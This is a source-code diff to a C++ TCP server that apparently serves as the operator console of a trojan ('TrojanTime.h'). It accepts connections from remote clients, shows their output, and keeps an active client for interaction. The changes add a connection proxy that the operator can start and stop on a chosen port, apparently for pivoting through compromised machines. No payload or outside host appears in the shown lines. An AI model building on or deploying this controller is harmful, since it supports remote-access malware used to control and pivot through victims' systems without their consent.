@@ -1,4 +1,6 @@
+#include <sstream>
 #include <iostream>
+#include <iterator>
 #include <netinet/in.h>
 #include <arpa/inet.h>
 #include <sys/types.h>
@@ -18,6 +20,7 @@
 #include "clients.h"
 #include "TrojanTime.h"
 #include <netinet/in.h>
+#include "ConnectionProxy.h"
 
 /////////////////////////////////////////////////////////
 // read from a FD (int) and save data in std::string
@@ -32,6 +35,8 @@ std::map<int, ReadLineAndSockAddr> mapReadLineFromFD;
 std::vector<pollfd> vecPollFDs;
 Clients clients;
 std::vector<int> vecFDs2Close;
+
+ConnectionProxy connectionProxy;
 
 void CloseFDs() {
 	for(const auto& iFD : vecFDs2Close) {
@@ -97,7 +102,7 @@ void SetFDnoneBlocking(int iFD) {
 	}
 }
 
-int SetupListenSoket(int port) {
+int SetupListenSoket(const int port) {
 	int sockListen = socket(AF_INET, SOCK_STREAM, 0);
 	if (sockListen < 0) {
 		fprintf(stderr, "Error creating socket: %s\n", strerror(errno));
@@ -126,7 +131,10 @@ int SetupListenSoket(int port) {
 	return sockListen;
 }
 
-void AddNewIncomingConnection(std::vector<pollfd>& vecPollFDs, unsigned int index) {
+/*
+ * accept all pending incoming connections
+ */
+void AddNewIncomingConnections(std::vector<pollfd>& vecPollFDs, unsigned int index) {
 	do {
 		sockaddr_in sa_in;
 		socklen_t len = sizeof(sa_in);
@@ -136,7 +144,7 @@ void AddNewIncomingConnection(std::vector<pollfd>& vecPollFDs, unsigned int inde
 				perror("  accept() failed");
 				exit(1);
 			}
-			break;
+			break;//no more incoming connection in case of EWOULDBLOCK
 		}
 		mapReadLineFromFD[new_sd].sa_in = sa_in;
 		clients.PrintInfo("Incoming connection, fd=" + std::to_string(new_sd));
@@ -149,6 +157,30 @@ void ClearLineAndGoToBegin() {
 	char clear_line[] = "\033[2K";
 	char line_up[] = "\033[1A";
 	std::cout << clear_line << std::endl << line_up;
+}
+
+void ParseCommand(const std::string& strLine) {
+	if(strLine.empty())
+		return;
+	std::istringstream iss(strLine);
+	std::vector<std::string> vecWords(
+			std::istream_iterator<std::string>{iss}, std::istream_iterator<std::string>());
+	try {
+		if(vecWords.at(0) == "proxy") {
+			if(vecWords.at(1) == "start") {
+				int port = std::stoi(vecWords.at(2));
+				connectionProxy.Start(port);
+			} else if(vecWords.at(1) == "stop") {
+				connectionProxy.Stop();
+			} else {
+				std::cout << "Malformed proxy command" << std::endl;
+				return;
+			}
+		}
+	} catch (const std::exception& ex) {
+		std::cout << "Malformed command" << std::endl;
+		return;
+	}
 }
 
 void ReadDataFromClient(const unsigned int fd) {
@@ -179,6 +211,7 @@ void ReadDataFromClient(const unsigned int fd) {
 			if (byteRead == '\n') {
 				std::string& strLine = mapReadLineFromFD[fd].strLine;
 				//printf("readline: %s\n", strLine.c_str());
+				client = clients.FindClientBySockFD(fd);
 				if (client) {
 					client->get().AddReceivedText(strLine);
 					if (clients.IsClientActive(client->get())) {
@@ -189,6 +222,7 @@ void ReadDataFromClient(const unsigned int fd) {
 								std::string("<") << strLine << std::string("\n") << std::flush;
 						clients.PrintPrompt();
 					}
+					ParseCommand(strLine);
 				} else {
 					auto iFD_replaced = clients.AddClient(Client(strLine, fd, mapReadLineFromFD[fd].sa_in));
 					if (iFD_replaced)
@@ -243,7 +277,7 @@ int main() {
 			if (vecPollFDs[i].revents == 0)
 				continue;
 			if (vecPollFDs[i].revents != POLLIN) {
-				printf("Error! vecPollFDs[%d].revents = %d\n", i, vecPollFDs[i].revents);
+				printf("%s Error! vecPollFDs[%d].revents = %d\n", __PRETTY_FUNCTION__, i, vecPollFDs[i].revents);
 				if (vecPollFDs[i].revents & POLLERR) {
 					clients.RemoveClientBySockFD(vecPollFDs[i].fd);
 					AddFD2BeClosed(vecPollFDs[i].fd);
@@ -254,7 +288,7 @@ int main() {
 			if (vecPollFDs[i].fd == STDIN_FILENO) {
 				HandleStdinRead();
 			} else if (vecPollFDs[i].fd == sockListen) {
-				AddNewIncomingConnection(vecPollFDs, i);
+				AddNewIncomingConnections(vecPollFDs, i);
 			} else {
 				ReadDataFromClient(vecPollFDs[i].fd);
 			}
